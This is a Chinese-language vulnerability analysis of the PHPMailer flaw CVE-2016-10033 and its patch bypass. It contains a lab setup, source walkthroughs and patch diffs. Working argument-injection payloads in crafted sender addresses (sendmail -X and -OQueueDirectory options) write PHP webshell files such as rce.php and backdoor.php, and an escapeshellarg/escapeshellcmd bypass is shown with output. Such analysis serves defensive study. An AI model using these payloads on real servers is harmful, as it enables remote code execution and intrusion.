PHPMailer 代码执行漏洞（CVE-2016-10033）分析（含通用POC）

原理: 

    因为mail函数最终是调用的系统的sendmail进行邮件发送，而sendmail支持-X参数，通过这个参数可以将日志写入指定文件。可以写文件，当然就可以写shell，造成RCE了。

我们来本地测试一下:
```
git init
git remote add origin https://github.com/PHPMailer/PHPMailer
git 
git fetch origin v5.2.17
git pull origin v5.2.17
```
test.php
```
<?php
require('phpmailer5.2.17/PHPMailerAutoload.php');

$mail = new PHPMailer;
$mail->setFrom($_GET['x'], 'Vuln Server');
$mail->Subject = '<?php phpinfo();?>';
$mail->addAddress('c@d.com', 'attacker');
$mail->msgHTML('test');
$mail->AltBody = 'Body';

$mail->send();
?>

```

> 记得要安装sendmail：sudo apt install sendmail

程序的调用流程是`setForm()->validateAddress()->send()->postSend()->mailSend()->mailPassthru()`

mailPassthru函数是调用mail函数的地方，我们知道mail函数的第五个参数是主要命令执行的地方，因此我们去mailSend()函数中看一下$param参数。
```
    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }

        //Can't use additional_parameters in safe_mode
        //@link http://php.net/manual/en/function.mail.php
        if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }
```

mailSend()函数
```
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
...
            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
```

$params 是从$this->Sender传过来的，最后做了一个sprintf 的格式化，加了一个`-f 参数`

而`$this->Sender` 在sendFrom()函数中做了初始化，sendFrom函数是对发送者邮箱的的邮箱格式做验证的函数。而发送者邮箱$address 我们一般是可以控制的。我们来看一下它是如何对邮箱做验证的。

```
    public function setFrom($address, $name = '', $auto = true)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        // Don't validate now addresses with IDN. Will be done in send().
        if (($pos = strrpos($address, '@')) === false or
            (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
            !$this->validateAddress($address)) {
            $error_message = $this->lang('invalid_address') . " (setFrom) $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $this->From = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }
```

第一处是用strpos验证邮箱是否有@符号，第二处是调用validateAddress()函数做邮箱正则验证。匹配模式是根据系统的PCRE_VERION 来选择，正常情况下是pcre8的正则。 我们可以再网站`https://regex101.com/r/aGGWWw/2` 里面做一些fuzz看看如何绕过正则

```
<?php
            if (defined('PCRE_VERSION')) {
                //This pattern can get stuck in a recursive loop in PCRE <= 8.0.2
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                //Fall back to older PCRE
                $patternselect = 'pcre';
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
        switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
```

绕过方式可以参考p牛的文章:  https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html ），

payload:

    aaa( -X/home/www/success.php )@qq.com


    
我们访问链接:`http://localhost:82/test.php?x=aaa(%20-X/var/www/html/rce.php%20)@qq.com`

最后mail执行的param的命令就是:`"-faaa( -X/var/www/html/rce.php )@qq.com"`

如果是非ubuntu系统，可能会有权限问题，可以加上`-OQueueDirectory=/tmp`

其他payload:
```

a. -OQueueDirectory=/tmp/. -X/tmp/shell.php @qq.com
() -OQueueDirectory=/tmp/. -X/tmp/shell.php @qq.com
a( -X/home/www/backdoor.php -OQueueDirectory=/tmp )@qq.com
" -X/home/www/backdoor.php -OQueueDirectory=/tmp "@qq.com
123@456  -oQ/tmp  -X./shell.php
```

参考: 

### 补丁分析

在phpmailerv5.2.18中，官方对这个漏洞做的patch是这个样子：

        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            $params = sprintf('-f%s', escapeshellarg($this->Sender));
        }

但是这样依旧能绕过，具体的可以参见Hcamael师傅的blog，

escapeshellarg会在给参数添加单引号，并转义存在的单引号。
```
php > var_dump(escapeshellarg("a'( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@a.com"))
php > ;
string(58) "'a'\''( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@a.com'"
```

正常情况下这样过滤是没有问题的，但是mail函数任然可以写文件成功。

因为再源码`ext/standand/mail.c:167`行处有
```
if (force_extra_parameters) {
        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
    } else if (extra_cmd) {
        extra_cmd = php_escape_shell_cmd(extra_cmd);
    }
```

也就是先escapeshellarg而后escapeshellcmd，这样也造成了escapeshellarg的保护没法达到预期的效果，从而再次RCE：

原理参考:PHP escapeshellarg()+escapeshellcmd() 之殇:https://paper.seebug.org/164/

大致是escapeshellarg和escapeshellcmd对单引号的处理不一样，导致单引号逃逸。

```
a'( -OQueueDirectory=/tmp -X/tmp/backdoor.php )@qq.com
=>escapeshellarg
'a'\''( -OQueueDirectory=/tmp -X/tmp/123.php )@qq.com'
=>escapeshellcmd
'a'\\''\( -OQueueDirectory=/tmp -X/tmp/123.php \)@qq.com\'
```

最后任然可以执行命令，只是有一些报错:
```
)@qq.com'... Unbalanced ')'
)@qq.com'... User address required
MAILER-DAEMON... Saved message in /var/lib/sendmail/dead.letter
[Tue Oct  2 18:24:55 2018] 127.0.0.1:58654 [200]: /test.php?x=aaa%27(%20-X/var/www/html/rce.php%20)@qq.com
```

phpmailer v5.2.19中未修复。

在phpmailerv5.2.20中的补丁为:
```
        if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
            // CVE-2016-10033, CVE-2016-10045: Don't pass -f if characters will be escaped.
            if (self::isShellSafe($this->Sender)) {
                $params = sprintf('-f%s', $this->Sender);
            }
        }
```


isShellSafe函数的定义:
```
    protected static function isShellSafe($string)
    {
        // Future-proof
        if (escapeshellcmd($string) !== $string
            or !in_array(escapeshellarg($string), array("'$string'", "\"$string\""))
        ) {
            return false;
        }

        $length = strlen($string);

        for ($i = 0; $i < $length; $i++) {
            $c = $string[$i];

            // All other characters have a special meaning in at least one common shell, including = and +.
            // Full stop (.) has a special meaning in cmd.exe, but its impact should be negligible here.
            // Note that this does permit non-Latin alphanumeric characters based on the current locale.
            if (!ctype_alnum($c) && strpos('@_-.', $c) === false) {
                return false;
            }
        }

        return true;
    }
```
先用escapeshellcmd和escapeshellarg验证，之后过滤了一些除`@_-.`之外的非字母和数字字符(ctype_alnum判断是否为字母和数字)


### 其他利用方式
我们来看一下sendmail函数的参数
```
-X logfile是记录log文件的，就是可以写文件；

-C file是临时加载一个配置文件，就是可以读文件；

-O option=value 是临时设置一个邮件存储的临时目录的配置。
```
phpmailer 还有很多bypass的方式，
如何在无绝对路径下写shell
如果我们当前目录你没权限写怎么办？或者你写入的文件没办法执行怎么办？
如果系统使用Exim4来发送邮件又该如何利用上面的漏洞呢

参考拓展: (Hack PHP mail additional_parameters)http://blog.nsfocus.net/hack-php-mail-additional_parameters/#Hack

参考: https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html

https://0x48.pw/2016/12/28/0x29/

